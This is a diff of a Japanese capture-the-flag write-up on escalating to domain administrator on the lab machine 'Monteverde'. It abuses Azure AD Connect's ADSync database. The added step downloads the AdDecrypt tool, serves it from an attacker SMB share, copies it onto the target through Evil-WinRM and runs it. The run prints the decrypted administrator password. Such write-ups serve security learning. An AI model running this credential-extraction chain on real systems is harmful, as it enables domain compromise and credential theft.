@@ -195,14 +195,85 @@ efa3cbf7ec605f05e2bf992719a040ff
 
 
 ## STEP 3
+所属グループを確認すると、「Azure Admins」を確認  
+```cmd
+*Evil-WinRM* PS C:\Users\mhope\Documents> whoami /groups
+
+GROUP INFORMATION
+-----------------
+
+Group Name                                  Type             SID                                          Attributes
+=========================================== ================ ============================================ ==================================================
+Everyone                                    Well-known group S-1-1-0                                      Mandatory group, Enabled by default, Enabled group
+BUILTIN\Remote Management Users             Alias            S-1-5-32-580                                 Mandatory group, Enabled by default, Enabled group
+BUILTIN\Users                               Alias            S-1-5-32-545                                 Mandatory group, Enabled by default, Enabled group
+BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                 Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\NETWORK                        Well-known group S-1-5-2                                      Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11                                     Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\This Organization              Well-known group S-1-5-15                                     Mandatory group, Enabled by default, Enabled group
+MEGABANK\Azure Admins                       Group            S-1-5-21-391775091-850290835-3566037492-2601 Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10                                  Mandatory group, Enabled by default, Enabled group
+Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448
+```
+ということで、Azureのお勉強タイム  
+[Microsoft Entra ID でサポートされるディレクトリ間のプロビジョニングの種類](https://learn.microsoft.com/ja-jp/entra/identity/hybrid/what-is-inter-directory-provisioning#what-types-of-inter-directory-provisioning-does-microsoft-entra-id-support)  
+Microsoft Entra Connectという、Active Directory と Microsoft Entra ID 間のプロピジョニングを行う機能があるらしい  
+「 Microsoft Entra Connect コマンド」でググると、[Microsoft Entra Connect: ADSync PowerShell リファレンス](https://learn.microsoft.com/ja-jp/entra/identity/hybrid/connect/reference-connect-adsync)を発見  
+そのリンク内で、「Get-ADSyncDatabaseConfiguration」コマンドが実行できた  
+コマンドで「ADSync」というデータベースを確認、どうやらオンプレとクラウド間の同期情報が格納されているっぽい
+```powershell
+*Evil-WinRM* PS C:\Users\mhope\Documents> Get-ADSyncDatabaseConfiguration 
+
+
+IsLocalDBInstalled    : False
+LocalDBUsedSpaceInMb  : 0
+SqlServerName         : MONTEVERDE.MEGABANK.LOCAL
+SqlServerInstanceName :
+SqlServerDBName       : ADSync
+```
+「ADSync exploit」でググると、[AdSyncDecrypt](https://github.com/VbScrub/AdSyncDecrypt)というツールを発見  
+[ポスト](https://web.archive.org/web/20230330142808/https://vbscrub.com/2020/01/14/azure-ad-connect-database-exploit-priv-esc/)を見ると、この[ツール](https://github.com/dirkjanm/adconnectdump/tree/master/ADSyncDecrypt/ADSyncDecrypt)のプリコンパイル版らしい  
+ということでダウンロード
 ```sh
-*Evil-WinRM* PS C:\Users\mhope\Documents> Get-AzContext -ListAvailable
+└─$ wget -nv https://github.com/VbScrub/AdSyncDecrypt/releases/download/v1.0/AdDecrypt.zip
+2025-08-15 04:42:12 URL:https://release-assets.githubusercontent.com/github-production-release-asset/257912912/7117a000-84a7-11ea-8b7b-d19439d5eb39?sp=r&sv=2018-11-09&sr=b&spr=https&se=2025-08-15T09%3A31%3A38Z&rscd=attachment%3B+filename%3DAdDecrypt.zip&rsct=application%2Foctet-stream&skoid=96c2d410-5711-43a1-aedd-ab1947aa7ab0&sktid=398a6654-997b-47e9-b12b-9515b896b4de&skt=2025-08-15T08%3A31%3A14Z&ske=2025-08-15T09%3A31%3A38Z&sks=b&skv=2018-11-09&sig=KPy%2FthAOha3deYOvknQ8dpco2unwtJLI7Y4m97lFfQ4%3D&jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmVsZWFzZS1hc3NldHMuZ2l0aHVidXNlcmNvbnRlbnQuY29tIiwia2V5Ijoia2V5MSIsImV4cCI6MTc1NTI0NzYzMiwibmJmIjoxNzU1MjQ3MzMyLCJwYXRoIjoicmVsZWFzZWFzc2V0cHJvZHVjdGlvbi5ibG9iLmNvcmUud2luZG93cy5uZXQifQ.WOzHixiR20k2PUdvq-qiQ0WTvOAf9lZQWotF78Ie1HM&response-content-disposition=attachment%3B%20filename%3DAdDecrypt.zip&response-content-type=application%2Foctet-stream [152818/152818] -> "AdDecrypt.zip" [1]
 
-Name                                     Account                                              SubscriptionName                                    Environment                                         TenantId
-----                                     -------                                              ----------------                                    -----------                                         --------
-372efea9-7bc4-4b76-8839-984b45edfb98 ... john@a67632354763outlook.onmicrosoft.com                                                                 AzureCloud                                          372efea9-7bc4-4b76-8839-984b45edfb98
+└─$ unzip AdDecrypt.zip                                             
+Archive:  AdDecrypt.zip
+  inflating: AdDecrypt.exe           
+  inflating: mcrypt.dll
 
-*Evil-WinRM* PS C:\Users\mhope\Documents> Get-AzSubscription
-Warning: Unable to acquire token for tenant '372efea9-7bc4-4b76-8839-984b45edfb98'
-Warning: Unable to acquire token for tenant '372efea9-7bc4-4b76-8839-984b45edfb98'
+└─$ impacket-smbserver -smb2support share .
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Config file parsed
+[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+[*] Config file parsed
+[*] Config file parsed
+```
+配送し、ポストで紹介されている使い方で実行
+```powershell
+*Evil-WinRM* PS C:\Users\mhope\Documents> copy \\10.10.16.23\share\mcrypt.dll
+
+*Evil-WinRM* PS C:\Users\mhope\Documents> copy \\10.10.16.23\share\AdDecrypt.exe
+
+*Evil-WinRM* PS C:\Program Files\Microsoft Azure AD Sync\Bin> C:\Users\mhope\Documents\AdDecrypt.exe -FullSQL
+
+======================
+AZURE AD SYNC CREDENTIAL DECRYPTION TOOL
+Based on original code from: https://github.com/fox-it/adconnectdump
+======================
+
+Opening database connection...
+Executing SQL commands...
+Closing database connection...
+Decrypting XML...
+Parsing XML...
+Finished!
+
+DECRYPTED CREDENTIALS:
+Username: administrator
+Password: d0m@in4dminyeah!
+Domain: MEGABANK.LOCAL
 ```
